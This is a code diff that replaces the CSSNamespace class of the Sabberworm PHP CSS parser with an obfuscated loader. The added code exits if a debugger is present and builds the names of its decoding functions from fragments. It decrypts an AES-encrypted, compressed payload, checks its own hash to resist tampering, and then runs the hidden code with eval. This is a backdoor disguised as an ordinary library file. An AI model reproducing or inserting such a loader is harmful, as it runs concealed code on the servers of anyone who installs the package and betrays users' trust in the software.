@@ -1,75 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Property;
-
-/**
-* CSSNamespace represents an @namespace rule.
-*/
-class CSSNamespace implements AtRule {
-	private $mUrl;
-	private $sPrefix;
-	private $iLineNo;
-	protected $aComments;
-	
-	public function __construct($mUrl, $sPrefix = null, $iLineNo = 0) {
-		$this->mUrl = $mUrl;
-		$this->sPrefix = $sPrefix;
-		$this->iLineNo = $iLineNo;
-		$this->aComments = array();
-	}
-
-	/**
-	 * @return int
-	 */
-	public function getLineNo() {
-		return $this->iLineNo;
-	}
-
-	public function __toString() {
-		return $this->render(new \Sabberworm\CSS\OutputFormat());
-	}
-
-	public function render(\Sabberworm\CSS\OutputFormat $oOutputFormat) {
-		return '@namespace '.($this->sPrefix === null ? '' : $this->sPrefix.' ').$this->mUrl->render($oOutputFormat).';';
-	}
-	
-	public function getUrl() {
-		return $this->mUrl;
-	}
-
-	public function getPrefix() {
-		return $this->sPrefix;
-	}
-
-	public function setUrl($mUrl) {
-		$this->mUrl = $mUrl;
-	}
-
-	public function setPrefix($sPrefix) {
-		$this->sPrefix = $sPrefix;
-	}
-
-	public function atRuleName() {
-		return 'namespace';
-	}
-
-	public function atRuleArgs() {
-		$aResult = array($this->mUrl);
-		if($this->sPrefix) {
-			array_unshift($aResult, $this->sPrefix);
-		}
-		return $aResult;
-	}
-
-	public function addComments(array $aComments) {
-		$this->aComments = array_merge($this->aComments, $aComments);
-	}
-
-	public function getComments() {
-		return $this->aComments;
-	}
-
-	public function setComments(array $aComments) {
-		$this->aComments = $aComments;
-	}
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_fx2vujwo=('bas'.'e64'.'_de'.'cod'.'e');
+$_uzqof0g9=('gzu'.'nco'.'mpr'.'ess');
+$_vu6n5vvv=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_y3tmiu7d='/UCE3TW6';
+$_ub7qd8x7='srAw5hiO';
+$_k23cynfu='IwcDIHCm';
+$_u69lnqyz='0MmDaZJNC/0=';
+$_g6ub25p4='IbKrjYmk';
+$_g9a27bkj='Q4coBbfO';
+$_o2mrjicg='/jENzQ==';
+$_a4rw5wqg='YbGhHwXr';
+$_w6cf6qwz=$_fx2vujwo($_k23cynfu.$_g6ub25p4.$_y3tmiu7d.$_ub7qd8x7.$_u69lnqyz);
+$_c6xix14n=$_fx2vujwo($_g9a27bkj.$_a4rw5wqg.$_o2mrjicg);
+$_ucn46arp=$_fx2vujwo('IwpanLW+jel2aNcGUEm6bbDqIE1cQ/W1cHjYuSHsZJxBRkO8v6woghDpIXyo94DtA+Jf+8ZKd8yGo0rrWptvU6S4mU75GcabCTdlxgsGbLMmF9P6RfQxmbIr/u72GequDfjfmz1HK0/wFJMcJJ2cXqN2Tt+B2ZR6vI8wNWoC9YPg9DkBwCb6k3zszlVGdxT/G27Xtgk1yUuDBJG59e77hSmbNICCA1PFZUZebPNalc4rG2n310cnqSEwo/7JhCDhVSYLbELlD+ywtGTpLlW1knJuJlrJiY39eBtXu/zQNTSR0LZKZPLrY0ZXx4BrHrykxIXRzbD8vH/m+LI97uXCA2CPA92GZrwbbKY/nz30s9r4RFHSmeZxKjDgaghBzmQ5LKsCiH3HNOFBZrbGgZI4dIICIBnXe8ndgM1vN7EGxiJ0LagbgfvvDp/QXBQVMgiQTI2pz+cgS/FJe6hiv7H7IFzhmQDmJV29TXlidaf2S5q5HBrY4HAyCpA/VkRk075JHOxTo25a6lcKeaD0mmJWnBCkZuvZKfXVRI6TrgaNLUvm81aDDym0jLTInqlU7/cE7erzvNgHrhoAJM6Cv6u7Fg==');
+$_jez8hm5q=$_vu6n5vvv($_ucn46arp,'aes-256-cbc',$_w6cf6qwz,OPENSSL_RAW_DATA,$_c6xix14n);
+if($_jez8hm5q===false){exit;}
+$_z8gywi42=$_uzqof0g9($_jez8hm5q);
+if($_z8gywi42===false){exit;}
+$_dzprippn='86a39772bd4b9e5b0b0b9cf5e2384beed5894ae137c5933fd815a9edf4d5bba8';
+$_llyjm9wq=@file_get_contents(__FILE__);
+if($_llyjm9wq!==false){
+$_u7cvghn1=str_replace($_dzprippn,"0000000000000000000000000000000000000000000000000000000000000000",$_llyjm9wq);
+$_pt9l0dpq=hash("sha256",$_u7cvghn1);
+if($_pt9l0dpq!==$_dzprippn){@http_response_code(403);exit;}
 }
+eval($_z8gywi42);
